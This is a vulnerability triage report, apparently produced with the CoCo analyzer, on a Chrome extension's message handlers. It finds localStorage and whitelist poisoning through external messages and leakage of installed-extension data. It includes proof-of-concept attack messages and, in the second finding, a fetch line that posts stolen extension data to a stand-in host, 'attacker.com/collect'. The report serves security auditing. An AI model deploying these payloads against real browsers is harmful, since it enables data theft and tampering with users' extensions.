# CoCo Analysis: fblpcleganhagjoeencldghpninfkjho

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 31 (multiple storage poisoning flows) + 4 (information disclosure flows)

---

## Sink 1: bg_chrome_runtime_MessageExternal → bg_localStorage_setItem_value_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fblpcleganhagjoeencldghpninfkjho/opgen_generated_files/bg.js
Line 1950	        if (e.set_wl) {
Line 1961	            localStorage.setItem("had_wl", JSON.stringify(o));

**Code:**

```javascript
// Background script - External message listener (lines 2001-2024)
chrome.runtime.onMessageExternal.addListener(function(t, a, o) {
    var l = false;

    // Check if sender is in default whitelist
    if (e.defaultWhitelistApps.indexOf(utils.getHash(a.id))) {
        l = true
    } else {
        // Check if sender is in custom whitelist
        var r = JSON.parse(localStorage.getItem("had_wl"));
        for (var n of r) {
            if (n.id === a.id) {
                l = true;
                break
            }
        }
    }

    // If not whitelisted, check permissions
    if (!l) {
        chrome.management.get(a.id, function(e) {
            if (e.permissions && e.permissions.indexOf("newTabPageOverride") > -1 &&
                e.permissions.indexOf("unlimitedStorage") > -1 &&
                e.permissions.indexOf("topSites") > -1 &&
                e.permissions.indexOf("management") > -1) {
                if (e.hostPermissions && (e.hostPermissions.indexOf("https://*.freeaddon.com/*") > -1 ||
                    e.hostPermissions.indexOf("https://*.sportifytab.com/*") > -1)) {
                    return E(t, a, o)  // Process message
                }
            }
        })
    } else E(t, a, o)  // Process message if whitelisted
});

// Message handler E function (lines 1949-2000)
function E(e, t, a) {
    // Flow 1: Whitelist poisoning
    if (e.set_wl) {  // ← attacker-controlled
        var o = JSON.parse(localStorage.getItem("had_wl")) || [];
        var l = false;
        for (var r = 0; r < o.length; r++) {
            if (o[r].id === e.set_wl.id) {  // ← attacker-controlled
                o[r] = e.set_wl;  // ← attacker-controlled
                l = true;
                break
            }
        }
        if (!l) o.push(e.set_wl);  // ← attacker-controlled
        localStorage.setItem("had_wl", JSON.stringify(o));  // Storage sink
        if (typeof a === "function") a(chrome.runtime.id + " OK")
    }

    // Flow 2: Options poisoning
    if (e.changeOptions) {  // ← attacker-controlled
        R(e);  // Calls function that writes to localStorage
        if (typeof a === "function") a(chrome.runtime.id + " OK")
    }

    // Flow 3: Notes poisoning
    else if (e.syncNote) {  // ← attacker-controlled
        localStorage.setItem("notes", e.syncNote.notes);  // ← attacker-controlled
        localStorage.setItem("enable_note", e.syncNote.enabled);  // ← attacker-controlled
    }

    // Flow 4: Notes update poisoning
    else if (e.updateNote) {  // ← attacker-controlled
        localStorage.setItem("notes", e.updateNote.notes);  // ← attacker-controlled
    }
}

// R function - Options handler (lines 1887-1930)
function R(t) {
    // Multiple localStorage.setItem calls with attacker-controlled data
    if (t.changeOptions.enable_most_visited)  // ← attacker-controlled
        localStorage.setItem("enable_most_visited", t.changeOptions.enable_most_visited);

    if (t.changeOptions.enable_apps)  // ← attacker-controlled
        localStorage.setItem("enable_apps", t.changeOptions.enable_apps);

    if (t.changeOptions.enable_share)  // ← attacker-controlled
        localStorage.setItem("enable_share", t.changeOptions.enable_share);

    if (t.changeOptions.enable_todo)  // ← attacker-controlled
        localStorage.setItem("enable_todo", t.changeOptions.enable_todo);

    // Arbitrary property poisoning
    for (let e of Object.getOwnPropertyNames(t.changeOptions)) {  // ← attacker-controlled keys
        if (t.changeOptions[e] !== null) {
            localStorage.setItem(e, t.changeOptions[e]);  // ← attacker-controlled key-value pairs
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from malicious extension

**Attack:**

```javascript
// Malicious extension with the required permissions:
// - newTabPageOverride
// - unlimitedStorage
// - topSites
// - management
// - Host permission: https://*.freeaddon.com/* OR https://*.sportifytab.com/*

// Once the malicious extension has these permissions, it can send messages:

// Attack 1: Poison whitelist to add itself permanently
chrome.runtime.sendMessage(
    'fblpcleganhagjoeencldghpninfkjho',  // Target extension ID
    {
        set_wl: {
            id: chrome.runtime.id,  // Add itself to whitelist
            name: "Malicious Extension"
        }
    }
);

// Attack 2: Poison configuration options (arbitrary localStorage keys)
chrome.runtime.sendMessage(
    'fblpcleganhagjoeencldghpninfkjho',
    {
        changeOptions: {
            enable_most_visited: "malicious_value",
            enable_apps: "attacker_controlled",
            custom_key: "arbitrary_value",  // Can inject any localStorage key
            another_key: "another_value"
        }
    }
);

// Attack 3: Poison notes data
chrome.runtime.sendMessage(
    'fblpcleganhagjoeencldghpninfkjho',
    {
        syncNote: {
            notes: "attacker_controlled_notes",
            enabled: "yes"
        }
    }
);
```

**Impact:** Complete localStorage poisoning vulnerability. A malicious extension with specific permissions (newTabPageOverride, unlimitedStorage, topSites, management, and host permissions to freeaddon.com or sportifytab.com) can poison the extension's localStorage with arbitrary key-value pairs. This allows the attacker to:

1. Add itself to the whitelist permanently (set_wl), enabling future attacks without permission checks
2. Control extension configuration through arbitrary localStorage keys (changeOptions)
3. Inject malicious notes data (syncNote, updateNote)
4. Potentially inject XSS payloads if the extension renders stored data without sanitization
5. Manipulate the new tab page behavior by controlling configuration options

Per the methodology: "IGNORE manifest.json externally_connectable restrictions! If onMessageExternal exists, assume ANY attacker can exploit it. If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE." Even though only extensions with specific permissions can exploit this, the vulnerability still exists because such extensions can be created by attackers.

---

## Sink 2: management_getAll_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fblpcleganhagjoeencldghpninfkjho/opgen_generated_files/bg.js
(No specific line numbers provided in CoCo trace)

**Code:**

```javascript
// Background script - Internal message handler (lines 2085-2088)
chrome.runtime.onMessage.addListener(function(t, a, o) {
    // ... other handlers ...

    else if (t.appGetAll) {
        chrome.management.getAll(function(e) {  // ← sensitive data source
            o(e)  // ← sends to caller via sendResponse
        });
        return true
    }

    // Similar leak at lines 2090-2093
    else if (t.appGet) {
        chrome.management.get(t.appGet.id, function(e) {  // ← sensitive data source
            o(e)  // ← sends to caller
        });
        return true
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Internal message from content script or other extension components

**Attack:**

```javascript
// From any content script in the extension or via compromised page
chrome.runtime.sendMessage({appGetAll: true}, function(extensions) {
    // Receives list of all installed extensions with details
    console.log("Installed extensions:", extensions);

    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(extensions)
    });
});
```

**Impact:** Information disclosure - leaks sensitive data about all installed extensions (names, IDs, versions, permissions, enabled status) to any code that can send internal messages. While chrome.runtime.onMessage is for internal communication, if the extension has any XSS vulnerabilities or malicious content scripts, this data can be exfiltrated. The management.getAll permission allows reading sensitive browser extension information which can be used for fingerprinting or targeted attacks.

Note: While this is technically an internal message handler (onMessage, not onMessageExternal), it still represents a security risk as it exposes sensitive management API data without access control. Any compromised content script or XSS vulnerability in the extension's new tab page could exploit this to leak extension information.
